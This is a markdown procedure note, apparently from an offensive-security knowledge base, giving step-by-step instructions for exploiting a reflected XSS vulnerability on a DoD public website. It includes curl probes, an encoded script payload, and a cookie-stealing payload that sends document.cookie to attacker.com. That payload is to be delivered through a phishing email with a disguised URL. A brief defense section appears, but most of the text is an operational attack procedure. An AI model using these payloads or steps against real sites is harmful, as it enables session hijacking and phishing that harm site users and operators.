---
tags:
  - xss
  - reflected-xss
  - javascript-injection
  - web-exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-fetch-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-09-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:37.411Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: d0ba3f57-3126-4239-8e0c-749862612e89
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-URL-for-Reflected-XSS

## Summary

This procedure demonstrates how to exploit a reflected cross-site scripting (XSS) vulnerability by crafting a URL that injects malicious JavaScript into a web application's response, leading to arbitrary code execution in the victim's browser. It is particularly effective against public-facing websites like the DoD site where user inputs are not properly sanitized.

## Description

In a reflected XSS attack, malicious script is embedded in a URL parameter (e.g., search query) and reflected back unsanitized in the server's HTML response. When the victim loads the URL, the browser executes the script in the context of the trusted domain, allowing attackers to steal cookies, session tokens, or manipulate the page. This procedure assumes a vulnerable parameter on the target website; testing involves crafting payloads and verifying reflection. Prerequisites include basic knowledge of HTML/JavaScript and access to a web browser or curl for verification. Expected outcomes include script execution confirming the vulnerability, with real-world impact on user privacy and site integrity.

## Requirements

1. Access to the target website (e.g., DoD public site)
2. Web browser for testing execution
3. Optional: curl or similar tool to inspect HTTP responses
4. Knowledge of URL encoding for payloads (e.g., via JavaScript console or online encoders)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML-escape user inputs with libraries like OWASP ESAPI)
- Use Content Security Policy (CSP) headers to restrict inline script execution
- Monitor for anomalous JavaScript in logs or WAF rules blocking common XSS payloads
- Educate users on phishing risks and verify URLs before clicking

## Objectives

1. Inject and reflect malicious JavaScript to execute in the browser
2. Demonstrate potential for session hijacking or data theft
3. Validate vulnerability for reporting or remediation

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Locate a reflected input field on the target website, such as a search box, where user input appears directly in the HTML response without sanitization.

Navigate to the DoD website and test parameters by appending benign strings (e.g., ?q=test) and checking the page source for reflection.

**Command** ([[commands/curl-fetch-url]]):
```bash
curl -s "https://target-dod-site.gov/search?q=test" | grep "test"
```

> This command fetches the page and searches for the reflected 'test' string. If present in HTML without escaping, the parameter is vulnerable.

### Step 2: Craft Malicious Payload

**Context**: Encode a simple JavaScript payload to test execution, such as an alert to confirm XSS.

Use URL encoding for special characters: <script>alert('XSS')</script> becomes %3Cscript%3Ealert('XSS')%3C/script%3E.

Construct the full URL: https://target-dod-site.gov/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E

### Step 3: Test Execution

**Context**: Load the crafted URL in a browser to verify script execution.

Open the URL in a browser. If vulnerable, an alert box should pop up.

For non-interactive testing, use curl to inspect the response:

**Command** ([[commands/curl-fetch-url]]):
```bash
curl -s "https://target-dod-site.gov/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E" | grep -i script
```

> Expected output includes the unescaped <script> tag in the HTML, confirming reflection. In a browser, the alert executes.

### Step 4: Escalate for Impact

**Context**: Once confirmed, modify the payload for real impact, e.g., to steal cookies.

Payload example: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

Deliver via phishing email with the shortened or disguised URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetch-url]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web-exploit]]
